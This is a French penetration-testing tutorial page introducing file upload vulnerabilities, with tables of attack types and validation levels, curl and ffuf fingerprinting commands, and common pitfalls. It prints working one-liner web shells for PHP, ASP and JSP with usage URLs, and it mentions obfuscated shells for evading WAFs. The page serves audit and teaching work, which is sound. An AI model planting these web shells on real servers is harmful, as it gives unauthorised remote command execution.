# Introduction aux attaques par upload de fichiers

Les fonctionnalités d'upload sont présentes dans quasiment toutes les applications web modernes. Réseaux sociaux, portails d'entreprise, CMS, plateformes RH : dès qu'un utilisateur peut déposer un fichier sur le serveur, une surface d'attaque s'ouvre. Si la validation des fichiers reçus est absente ou mal implémentée, un attaquant peut déposer du code exécutable et prendre le contrôle du serveur en quelques requêtes. Ce type de vulnérabilité figure régulièrement dans les rapports CVE et se retrouve souvent classé en sévérité High ou Critical.

## Pourquoi

L'upload de fichiers est l'un des rares mécanismes web qui permet à un utilisateur externe de déposer du contenu directement sur le système de fichiers du serveur. Quand les contrôles de validation sont faibles ou absents, cette fonctionnalité devient un vecteur d'intrusion majeur.

Le scénario le plus critique est l'upload arbitraire non authentifié : n'importe quel visiteur peut déposer n'importe quel type de fichier, sans restriction. Il suffit alors d'uploader un web shell pour obtenir une exécution de commandes sur le serveur.

{% hint style="danger" %}
Un upload non filtré transforme une simple fonctionnalité utilisateur en porte d'entrée directe vers le système. C'est l'une des vulnérabilités les plus impactantes qu'on puisse trouver lors d'un audit web.
{% endhint %}

## Comment ça marche

### Types d'attaques via l'upload

L'exploitation d'une fonctionnalité d'upload ne se limite pas à l'exécution de code. Selon les filtres en place et les types de fichiers acceptés, plusieurs vecteurs d'attaque existent :

| Type d'attaque | Mécanisme | Impact |
|---|---|---|
| Web shell | Upload d'un script serveur (PHP, ASP, JSP) qui accepte des commandes | RCE complète |
| Reverse shell | Upload d'un script qui initie une connexion sortante vers l'attaquant | RCE interactive |
| XSS | Upload de fichiers HTML, SVG ou images avec métadonnées malveillantes | Vol de session, phishing |
| XXE | Upload de fichiers SVG, XML ou documents Office contenant des entités XML externes | Lecture de fichiers serveur, SSRF |
| DoS | Upload de fichiers surdimensionnés, archives à décompression explosive (zip bomb), pixel flood | Indisponibilité du service |
| Écrasement de fichiers | Traversée de répertoires dans le nom du fichier uploadé | Compromission de la configuration |

{% hint style="info" %}
L'attaque la plus recherchée reste l'exécution de code à distance via un web shell ou un reverse shell. Mais même quand l'upload est restreint à des types spécifiques (images, documents), des attaques secondaires comme le XSS ou le XXE restent possibles.
{% endhint %}

### Niveaux de validation

Les applications web implémentent différents niveaux de contrôle sur les fichiers uploadés. Chaque niveau peut être contourné si l'implémentation est incorrecte :

| Niveau | Où | Ce qui est vérifié | Difficulté de contournement |
|---|---|---|---|
| Aucune validation | - | Rien | Trivial |
| Validation côté client | Front-end (JavaScript) | Extension du fichier | Très facile |
| Blacklist d'extensions | Back-end | Extension contre une liste d'interdictions | Facile à moyen |
| Whitelist d'extensions | Back-end | Extension contre une liste d'autorisations | Moyen |
| Content-Type header | Back-end | Header MIME envoyé par le client | Facile |
| Magic bytes / MIME type | Back-end | Premiers octets du fichier | Moyen |
| Combinaison de filtres | Back-end | Plusieurs contrôles simultanés | Difficile |

### Identifier le framework web

Avant de tenter un upload malveillant, il faut déterminer quel langage tourne sur le serveur. Le web shell doit être écrit dans le même langage que l'application cible pour être exécuté.

**Méthode manuelle : tester les extensions**

On visite l'URL racine en ajoutant différentes extensions pour voir laquelle répond :

```bash
# - Tester les extensions courantes
curl -s -o /dev/null -w "%{http_code}" http://<IP_CIBLE>:<PORT>/index.php
curl -s -o /dev/null -w "%{http_code}" http://<IP_CIBLE>:<PORT>/index.asp
curl -s -o /dev/null -w "%{http_code}" http://<IP_CIBLE>:<PORT>/index.aspx
curl -s -o /dev/null -w "%{http_code}" http://<IP_CIBLE>:<PORT>/index.jsp
```

Une réponse 200 confirme l'extension utilisée. On peut aussi automatiser cette étape avec `ffuf` et une wordlist d'extensions web.

**Méthode passive : empreinte technologique**

Des extensions comme Wappalyzer identifient automatiquement les technologies en analysant les headers HTTP, les cookies, le code JavaScript et la structure HTML. Elles révèlent le langage serveur, le framework, le serveur web et sa version.

```bash
# - Inspecter les headers de réponse
curl -sI http://<IP_CIBLE>:<PORT>/ | grep -iE 'server|x-powered-by|set-cookie'
```

{% hint style="success" %}
Le header `X-Powered-By` révèle souvent le langage (PHP, ASP.NET). Les cookies de session donnent aussi des indices : `PHPSESSID` pour PHP, `ASP.NET_SessionId` pour .NET, `JSESSIONID` pour Java.
{% endhint %}

## En pratique

### Vérification rapide de la surface d'upload

Depuis un conteneur Exegol, la première étape consiste à identifier les fonctionnalités d'upload et le framework :

```bash
# - Identifier le langage serveur
curl -sI http://<IP_CIBLE>:<PORT>/ | grep -iE 'server|x-powered-by'

# - Fuzzer les extensions pour confirmer
ffuf -w /opt/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ \
     -u http://<IP_CIBLE>:<PORT>/indexFUZZ \
     -fs 0

# - Chercher des fonctionnalités d'upload
ffuf -w /opt/seclists/Discovery/Web-Content/common.txt:FUZZ \
     -u http://<IP_CIBLE>:<PORT>/FUZZ \
     -fc 404 | grep -iE 'upload|file|import|attach'
```

### Web shells par langage

Voici les web shells one-liner les plus courants selon le langage identifié :

{% tabs %}
{% tab title="PHP" %}
```php
<?php system($_REQUEST['cmd']); ?>
```

Usage : `http://<IP_CIBLE>:<PORT>/uploads/shell.php?cmd=id`
{% endtab %}

{% tab title="ASP" %}
```asp
<% eval request('cmd') %>
```

Usage : `http://<IP_CIBLE>:<PORT>/uploads/shell.asp?cmd=whoami`
{% endtab %}

{% tab title="JSP" %}
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
Ces web shells basiques sont facilement détectés par les WAF et les antivirus. En conditions réelles, on privilégie des shells plus élaborés ou obfusqués, ou des outils comme `msfvenom` pour générer des payloads adaptés.
{% endhint %}

## Pièges et galères

- **Framework mal identifié** : uploader un web shell PHP sur un serveur ASP.NET ne donnera rien. Le fichier sera stocké mais jamais exécuté. Toujours confirmer le langage avant de choisir le payload.
- **Upload réussi mais fichier introuvable** : certaines applications renomment les fichiers uploadés (hash MD5, UUID) ou les stockent hors du répertoire web. Il faut alors identifier le chemin réel, souvent via le code source ou le fuzzing.
- **Validation côté client uniquement** : une restriction JavaScript sur les extensions se contourne en une seconde via Burp Suite ou les outils développeur du navigateur. Ne jamais supposer qu'un contrôle front-end protège réellement le serveur.
- **Exécution bloquée malgré l'upload** : le fichier est bien uploadé, mais le serveur ne l'exécute pas. Cela peut venir de la configuration du serveur web (seules certaines extensions déclenchent l'interpréteur) ou de `disable_functions` en PHP.
- **Répertoire d'upload sans exécution** : certains serveurs configurent le répertoire d'upload avec `Options -ExecCGI` ou un handler qui ne traite pas les scripts. Le fichier est accessible mais rendu en texte brut.

## Retour terrain

En audit, les vulnérabilités d'upload se rencontrent à différents niveaux de maturité. Les applications internes et les portails développés à la va-vite sont souvent les plus exposés, parfois sans aucune validation. Les applications modernes combinent généralement plusieurs couches de filtres, mais des erreurs d'implémentation persistent (regex mal écrite, blacklist incomplète, Content-Type non vérifié).

La première chose à vérifier sur une fonctionnalité d'upload est le niveau de contrôle en place. On commence par tenter un upload direct d'un fichier PHP ou ASP. Si ça passe, c'est une vulnérabilité critique immédiate. Si l'upload est refusé, on analyse le message d'erreur et les conditions de rejet pour identifier quel type de filtre est actif et comment le contourner.

Les pages suivantes détaillent chaque type de filtre et les techniques de contournement associées.

## Mémo express

| Élément | Détail |
|---|---|
| Risque principal | RCE via web shell ou reverse shell |
| Pire cas | Upload arbitraire non authentifié |
| Identifier le framework | Headers HTTP, cookies de session, fuzzing d'extensions |
| Web shell PHP | `<?php system($_REQUEST['cmd']); ?>` |
| Web shell ASP | `<% eval request('cmd') %>` |
| Outils d'identification | Wappalyzer, Burp Suite, ffuf |
| Wordlist extensions | `/opt/seclists/Discovery/Web-Content/web-extensions.txt` |

***
